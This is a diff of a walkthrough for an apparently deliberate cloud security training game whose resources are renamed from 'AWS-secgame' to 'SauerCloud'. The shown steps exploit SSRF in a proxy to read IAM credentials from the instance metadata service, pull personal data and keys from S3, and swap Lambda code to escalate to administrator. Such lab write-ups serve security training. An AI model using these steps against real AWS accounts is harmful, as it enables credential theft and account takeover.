@@ -21,7 +21,7 @@ $ `aws --profile solus ec2 describe-instances`
 List the existing instances. There are quite a number of them, but one has the tag "proxy" and a public IP address. 
 
 
-$ `curl <public ip of proxy instance>?url=169.254.169.254/latest/meta-data/iam/security-credentials/AWS-secgame-mission5-role-ec2proxy-$id`
+$ `curl <public ip of proxy instance>?url=169.254.169.254/latest/meta-data/iam/security-credentials/SauerCloud-mission5-role-ec2proxy-$id`
 
 The proxy is vulnerable to SSRF (server-side request forgery) and allows us to query the metadata server.
 
@@ -36,7 +36,7 @@ $ `aws --profile mission5_ec2 s3 ls`
 This allows us to list s3 buckets. Only one of them is available.
 
 
-$ `aws --profile mission5_ec2 s3 sync s3://aws-secgame-mission5-s3-personal-data-emmyselly-$id .; cat aws_key_reminder.txt`
+$ `aws --profile mission5_ec2 s3 sync s3://sauercloud-mission5-s3-personal-data-emmyselly-$id .; cat aws_key_reminder.txt`
 
 Sync the contents of the bucket and read the AWS keys.
 
@@ -100,7 +100,7 @@ $ `aws --profile emmyselly lambda list-functions`
 List existing lambda functions. We can get the code for one of them.
 
 
-$ `aws --profile emmyselly lambda get-function --function-name AWS-secgame-mission5-lambda-change-group-$id`
+$ `aws --profile emmyselly lambda get-function --function-name SauerCloud-mission5-lambda-change-group-$id`
 
 A link is given as output. Open it in a browser and download the .zip file.
 
@@ -118,12 +118,12 @@ $ `aws --profile emmyselly iam list-groups`
 List the existing groups. An interesting group appears to be privileged-$id. Let us check the lambda policy to verify if we can assign it.
 
 
-$ `aws --profile emmyselly iam list-role-policies --role-name AWS-secgame-mission5-lambda-set-suspect-service-role-$id`
+$ `aws --profile emmyselly iam list-role-policies --role-name SauerCloud-mission5-lambda-set-suspect-service-role-$id`
 
 Check the policies attached to this role. Only one is found.
 
 
-$ `aws --profile emmyselly iam get-role-policy --role-name AWS-secgame-mission5-lambda-set-suspect-service-role-$id --policy-name AWS-secgame-mission5-role-lambda-set-suspect-$id`
+$ `aws --profile emmyselly iam get-role-policy --role-name SauerCloud-mission5-lambda-set-suspect-service-role-$id --policy-name SauerCloud-mission5-role-lambda-set-suspect-$id`
 
 Get the policy. Notice you can assign either suspects or privileged groups. This means we can now craft the attack using the lambda function.
 
@@ -133,7 +133,7 @@ $ `vim lambda-change-group.py; zip lambda.zip lambda-change-group.py`
 Edit the function to swap out the group name, and zip the function again
 
 
-$ `aws --profile emmyselly lambda update-function-code --function-name AWS-secgame-mission5-lambda-change-group-$id --zip-file fileb://lambda.zip`
+$ `aws --profile emmyselly lambda update-function-code --function-name SauerCloud-mission5-lambda-change-group-$id --zip-file fileb://lambda.zip`
 
 Load the new function code in the lambda. The code is triggered when someone attempts to shut down the security hypervisor. Let us trigger the code.
 
@@ -224,7 +224,7 @@ $ `aws --profile hades iam get-user-policy --user-name hades-$id --policy-name h
 Display the policy. Notice you are administrator!
 
 
-$ `aws --profile hades s3 ls; aws --profile hades s3 sync s3://aws-secgame-mission5-super-secret-utlimate-s3-$id ./final-bucket; cd final-bucket`
+$ `aws --profile hades s3 ls; aws --profile hades s3 sync s3://sauercloud-mission5-super-secret-utlimate-s3-$id ./final-bucket; cd final-bucket`
 
 Find the last bucket and download its contents.
 
